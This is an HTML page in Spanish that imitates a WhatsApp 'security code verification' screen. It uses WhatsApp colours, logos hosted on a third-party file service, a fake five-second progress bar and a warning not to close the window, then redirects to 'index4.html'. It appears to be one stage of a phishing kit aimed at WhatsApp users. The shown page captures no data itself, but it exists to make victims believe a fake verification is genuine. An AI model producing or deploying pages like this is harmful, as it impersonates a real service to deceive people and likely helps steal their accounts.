<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad - WhatsApp</title>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #075E54; /* Color oficial de WhatsApp */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }
        
        .loading-wrapper {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 25px;
        }
        
        .app-logo {
            width: 120px;
            height: auto;
            margin-bottom: 15px;
        }
        
        .status-message {
            font-size: 1.3rem;
            font-weight: 500;
            margin: 0;
            line-height: 1.4;
        }
        
        .progress-track {
            width: 100%;
            height: 6px;
            background-color: rgba(255, 255, 255, 0.15);
            border-radius: 3px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            width: 0%;
            background-color: #25D366; /* Verde de WhatsApp */
            border-radius: 3px;
            animation: fillProgress 5s linear forwards;
        }
        
        .hint-text {
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.7);
            margin-top: 5px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-top: 15px;
        }
        
        .brand-footer {
            position: absolute;
            bottom: 25px;
        }
        
        .brand-logo {
            width: 70px;
            height: auto;
            opacity: 0.8;
        }
        
        @keyframes fillProgress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-wrapper">
        <img src="https://sappsapp23.sirv.com/docs/JvsnINJ2CZv.svg" alt="WhatsApp" class="app-logo">
        
        <p class="status-message">Verificando código de seguridad...</p>
        
        <div class="progress-track">
            <div class="progress-fill"></div>
        </div>
        
        <p class="hint-text">Por favor no cierres esta ventana</p>
        
        <div class="loading-spinner"></div>
    </div>

    <div class="brand-footer">
        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="WhatsApp" class="brand-logo">
    </div>

    <script>
        // Redirección después de 5 segundos
        setTimeout(() => {
            window.location.href = "index4.html";
        }, 5000);
    </script>
</body>
</html>
